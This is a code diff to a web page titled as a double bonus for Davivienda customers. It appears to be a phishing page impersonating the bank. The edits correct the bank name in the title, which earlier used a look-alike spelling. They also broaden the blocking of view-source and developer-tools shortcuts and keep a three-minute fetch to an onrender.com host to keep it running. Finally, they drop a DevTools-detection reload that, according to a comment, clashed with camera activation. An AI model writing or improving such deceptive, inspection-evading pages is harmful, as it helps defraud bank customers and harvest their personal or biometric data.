@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Bono Clientes x2 DAVlVlENDA🤑</title>
+  <title>Bono Clientes x2 DAVIVIENDA🤑</title>
   
   <style>
     html, body {
@@ -41,65 +41,31 @@
       // Ctrl+U, Ctrl+Shift+I, F12, Ctrl+Shift+C, Ctrl+Shift+J
       if (
         (e.ctrlKey && e.key === 'u') ||
-        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) ||
         (e.key === 'F12') ||
-        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-        (e.ctrlKey && e.shiftKey && e.key === 'J')
+        (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j'))
       ) {
         e.preventDefault();
         return false;
       }
     });
 
-    // Detectar si abren DevTools
-    (function() {
-      var devtools = {
-        open: false,
-        orientation: null
-      };
-      
-      var threshold = 160;
-      var emitEvent = function(state, orientation) {
-        window.dispatchEvent(new CustomEvent('devtoolschange', {
-          detail: {
-            open: state,
-            orientation: orientation
-          }
-        }));
-      };
-
-      setInterval(function() {
-        var widthThreshold = window.outerWidth - window.innerWidth > threshold;
-        var heightThreshold = window.outerHeight - window.innerHeight > threshold;
-        var orientation = widthThreshold ? 'vertical' : 'horizontal';
-
-        if (!(heightThreshold && widthThreshold) &&
-          ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
-          if (!devtools.open || devtools.orientation !== orientation) {
-            emitEvent(true, orientation);
-            // Si detecta DevTools, recarga la página
-            window.location.reload();
-          }
-          devtools.open = true;
-          devtools.orientation = orientation;
-        } else {
-          if (devtools.open) {
-            emitEvent(false, null);
-          }
-          devtools.open = false;
-          devtools.orientation = null;
-        }
-      }, 500);
-    })();
+    // Auto-ping para mantener Render activo (cada 3 minutos)
     setInterval(async () => {
-  try {
-    const res = await fetch("https://bonodaviviendaclientes.onrender.com"); 
-    const text = await res.text();
-    console.log("🔄 Auto-ping realizado:", text);
-  } catch (error) {
-    console.error("❌ Error en auto-ping:", error.message);
-  }
-}, 180000);
+      try {
+        const res = await fetch("https://bonodaviviendaclientes.onrender.com"); 
+        const text = await res.text();
+        console.log("📄 Auto-ping realizado:", new Date().toLocaleTimeString());
+      } catch (error) {
+        console.error("❌ Error en auto-ping:", error.message);
+      }
+    }, 180000);
+
+    // ⚠️ IMPORTANTE: Detección de DevTools REMOVIDA
+    // La detección agresiva causa recargas cuando se activa la cámara
+    // Si necesitas protección contra DevTools, usa una solución más específica
+    // que no dependa de cambios en dimensiones del viewport
   </script>
 </head>
 <body>
@@ -112,6 +78,3 @@
   ></iframe>
 </body>
 </html>
-
-
-
